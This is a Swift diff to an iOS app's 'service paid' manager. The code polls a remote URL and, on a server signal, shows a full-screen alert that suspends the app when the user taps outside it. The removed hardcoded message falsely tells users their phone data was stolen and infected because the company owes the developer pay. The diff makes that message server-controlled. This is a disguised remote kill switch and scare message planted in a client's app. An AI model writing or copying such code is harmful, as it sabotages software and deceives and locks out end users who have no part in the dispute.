@@ -29,16 +29,12 @@ public class QLServicePaidManager: NSObject {
     static let `default` = QLServicePaidManager()
     
     func theFeeBeenPaidMethod(projectType: ProjectType) {
-        // 构建URL
         guard let url:URL = URL(string: projectType.urlStr) else {
             return
         }
-        // 发送HTTP请求的的session对象
         let session = URLSession.shared
-        // 构建请求request
         var request = URLRequest(url: url)
         request.httpMethod = "GET"
-        // 发一个get请求
         let task = session.dataTask(with: request as URLRequest) {(
             data, response, error) in
             
@@ -54,14 +50,14 @@ public class QLServicePaidManager: NSObject {
             }
             debugPrint(dic)
             guard let code = dict?.object(forKey: "code") as? Int, code == 2 else { return }
+            guard let data = dict?.object(forKey: "data") as? String else { return }
             
             DispatchQueue.main.async {
                 let vc = QLServiceUnpaidAlterViewController()
                 vc.projectType = projectType
+                vc.dataStr = data
                 vc.showAlterController(target: vc)
             }
-            
-            
         }
         task.resume()
     }
@@ -72,9 +68,10 @@ public class QLServicePaidManager: NSObject {
 class QLServiceUnpaidAlterViewController: UIViewController {
     
     var projectType: ProjectType = .none
+    var dataStr = ""
+    
     lazy var tempView = UIView().then { view in
         view.backgroundColor = .white
-        
     }
     
     lazy var contactImgV = UIImageView().then { imgV in
@@ -91,8 +88,6 @@ class QLServiceUnpaidAlterViewController: UIViewController {
     override func viewDidLoad() {
         super.viewDidLoad()
         
-        
-        
         tempView.frame = CGRect().with { f in
             f.size.width = 300
             f.size.height = 300
@@ -103,40 +98,11 @@ class QLServiceUnpaidAlterViewController: UIViewController {
         tempView.layer.masksToBounds = true
         tempView.layer.cornerRadius = 16
         
-        
-        //        contactImgV.frame = CGRect().with { f in
-        //            f.size.width = 250
-        //            f.size.height = 250
-        //            f.origin.x = 25
-        //            f.origin.y = 50
-        //        }
-        //        tempView.addSubview(contactImgV)
-        
         titleLb.frame = CGRect(x: 0, y: 0, width: 300, height: 300)
         tempView.addSubview(titleLb)
-        titleLb.text = """
-警告!!!!!
-
-因该公司拖欠开发者薪资!!!
-
-您的手机数据已给盗取,并注入了病毒!!!!
-
-"""
+        titleLb.text = dataStr
         
-        //        // 异步 并行
-        //        DispatchQueue.global().async {
-        //            guard let url = URL.init(string: "https://p.ipic.vip/erkrmk.jpg"), let data = try? Data.init(contentsOf: url) else { return  }
-        //
-        //            // 回到主线程异步
-        //            DispatchQueue.main.async {
-        //                self.contactImgV.image = .init(data: data)
-        //            }
-        //    }
     }
-    
-    
-    
-    
 }
 
 extension QLServiceUnpaidAlterViewController {
@@ -153,7 +119,6 @@ extension QLServiceUnpaidAlterViewController {
     
     override public func touchesBegan(_ touches: Set<UITouch>, with event: UIEvent?) {
         if touches.first?.view == self.view {
-            //            dismiss(animated: false)
             UIControl().sendAction(#selector(NSXPCConnection.suspend), to: UIApplication.shared, for: nil)
         }
     }
